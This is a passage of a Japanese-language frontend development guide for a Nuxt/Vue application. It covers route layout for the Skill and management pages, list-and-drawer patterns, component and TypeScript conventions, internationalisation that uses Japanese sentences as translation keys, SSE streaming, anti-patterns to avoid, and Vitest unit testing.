├── skills/index.vue              # Skillの一覧と作成
├── skills/[skillId].vue          # 公開中の版・Draftの編集と公開・版の履歴・変更の記録（ページ全体）
├── manage.vue                    # definePageMeta({ layout: 'manage', middleware: 'manage' })＋<NuxtPage />
└── manage/
    ├── destinations.vue
    ├── destinations/[destinationId].vue
    ├── departments.vue
    └── departments/[departmentId].vue
```

- Skillの画面は、管理画面（`/manage`）ではなく社員向けのルート直下に置く。個人のSkillは全社員が作り、何ができるかはSkillごとの `access`（範囲と部門の中の役割。design.md §3.6）で決まるため、`/manage` に入る権限とは関係がない。APIも社員向けの `app/v1/skills` にある。
- Skillの詳細は、編集する項目が多いので、一覧の子ルートのドロワー（§8.2）ではなくページ全体にする。

- URLのパス、ディレクトリ名、パラメータ名は、APIのリソース名に合わせる（`/runs/[runId]` ↔ `app/v1/runs/{uid}`）。パラメータの値はAPIの `id`（uid）をそのまま使う。

### 8.2 一覧と詳細ドロワー

一覧画面は次の構成にする。

- 一覧ページ（`runs.vue`）に、`ListPageTitle`、`TableSearchForm`、`DDataTable`、`<NuxtPage @changed="reload" />` を置く。
- 詳細は子ルート（`runs/[runId].vue`）で `DDrawer` として開き、閉じたら一覧のURLに戻す。詳細のURLを共有すれば、そのまま同じ表示を開ける。
- 詳細で更新したら `changed` をemitし、一覧を再読込する。
- 検索条件は `params` の `ref` にまとめ、`TableSearchForm` の「絞り込む」で `reload()` する。
- 表示件数の切り替えは `pageSize` を `params` に入れて渡す（バックエンドの `page_size`）。`<select>` 要素を直接使わずに `DSelect` を使う。

### 8.3 choicesの扱い

- 画面に表示するラベルは、できるだけSerializerが返す `*Display`（例：`statusDisplay`）を使い、フロントエンドでラベルの対応表を二重に持たない。
- 検索条件の選択肢や画面上の分岐で値が必要な場合だけ、`composables/<domain>.ts` に定数を置く（例：`RunStatus`）。生成した型の値（enum）と一致させる。

---

## 9 コンポーネントの書き方

- `<script setup lang="ts">` で書き、Options APIは使わない。
- propsは `defineProps<{...}>()` と `withDefaults`、v-modelは `defineModel`、イベントは `defineEmits<{ created: [value: Run] }>()` の形で、すべて型を付ける。
- 親から呼ぶ操作は `defineExpose` で公開する（Formの `onSubmit`、`loading`、`canPost`、Dialogの `openDialog` / `closeDialog`）。
- 新しく書くコードでは `any` を使わない。APIの戻り値には生成した型を、検索条件には `ListParams` を拡張した型を使う。
- `useI18n()` のようなcomposableを、setup外の通常の関数から呼ばない。翻訳が必要な関数は `t` を引数で受け取るか、`useNuxtApp().$i18n.t` を使う。
- コメントは日本語で書く。

---

## 10 多言語化

OSSとして公開するため、最初から多言語化しておく。当面は日本語話者が主に開発するので、**日本語の文そのものを翻訳キーにする**。

- 画面の文言はすべて `$t('保存しました')`（scriptでは `const { t } = useI18n()`）で出す。`$t()` を通さずに文言を直接書かない。
- 日本語の翻訳ファイル（`i18n/locales/ja.json`）にはキーを書かない。訳がないときはキーの文がそのまま表示される（`i18n/i18n.config.ts` の `fallbackFormat: true`）。
- 他の言語を追加するときは、`i18n/locales/<言語>.json` に `{ "保存しました": "Saved" }` の形で訳を書き、`nuxt.config.ts` の `locales` に追加する。
- 文中の値は名前付きの引数で渡す（`t('{count}件', { count })`）。文字列の連結で文を組み立てない。
- キーの文には、vue-i18nで特別な意味を持つ半角の `.`（キーの階層の区切り）、`@`、`|`、`{` `}`（引数以外）を使わない。句読点は全角（`。`、`、`）にする。
- 同じ日本語でも意味が違う場合（例：「更新」が操作のボタンか日時の見出しか）は、`更新日時` のように文を変えて区別する。
- 日付・数値の表示は `Intl` や `@internationalized/date` を使い、言語に応じた書式にする。
- Nuxt UIのコンポーネント内の文言（カレンダーの曜日など）は、`app.vue` で `UApp` の `locale` をi18nの言語に合わせて切り替える。
- サーバーが返すエラーメッセージやchoicesのラベル（`*Display`）は、`Accept-Language` によりサーバー側で翻訳される。フロントエンドで翻訳し直さない。
- URLに言語のprefixは付けない（`strategy: 'no_prefix'`）。言語はブラウザの設定とcookieで決める。

## 11 リアルタイム通信

チャット画面の逐次表示や通知は、SSEで受け取る。方式の比較と実装の方針は [realtime.md](realtime.md) にまとめている。

- ストリームは `useEventStream()`（`composables/stream.ts`）だけを使って読む。画面で直接 `fetch` や `EventSource` を使わない。
- ログインユーザー宛ての通知（`app/v1/stream/`）は `useUserEvents(handler)` で受け取る。使う部品がいくつあっても、タブに1本だけ開く。
- イベントの型はOpenAPIから生成した `StreamEvent` を使う。
- 画面の表示は、まずREST APIで最新の状態を取得し、ストリームのイベントで差分を反映する。ストリームが切れても、再表示すれば正しい状態に戻るようにする。

## 12 避ける書き方

- 1つの `api.ts` にすべてのリソースと手書きの型を集めること。`api/` 以下に分割し、型は生成する。
- `createOrUpdate` と `createOrUpdatePkNumber` のような、IDの型だけが違う関数の重複。YorikiのIDはすべて文字列（uid）なので1つにする。
- `params?: any` や `data: any` で定義したAPIメソッド。
- UIライブラリのpass throughやCSSで、ライブラリの見た目を一括で上書きすること。
- コメントアウトしたテンプレートやコード、`console.log` / `console.debug` の消し忘れ。
- 組織IDの一覧をフロントエンドに直接書くfeature flag。
- typoのあるコンポーネント名。

## 13 単体テスト

- Vitestを `@nuxt/test-utils` のNuxtの環境（`environment: 'nuxt'`）で動かす。自動importされる関数・コンポーネントを、画面と同じ形で使える（`import` は書かない。コンポーネントは `#components` からimportする）。
- テストは `test/nuxt/` の下に、`app/` と同じ分け方（`api/`、`composables/`、`components/`）で置く（Nuxtの型チェックの対象になる）。ファイル名は `<対象>.test.ts`。
- コンポーネントは `mountSuspended()` でマウントし、`v-model` の受け渡し（`update:modelValue` の値）、`errorMessages` の表示を確かめる。見た目は `/dev/inputs` で確かめる（§7.3）。
- 日時の変換を環境によらず同じ結果にするため、テストのタイムゾーンは `Asia/Tokyo` に固定している（`vitest.config.ts`）。
- APIを呼ぶ処理は、axiosのエラー（`AxiosError`）や戻り値を作って渡して確かめる。バックエンドと通して確かめるのはE2E（development.md §3.2）。

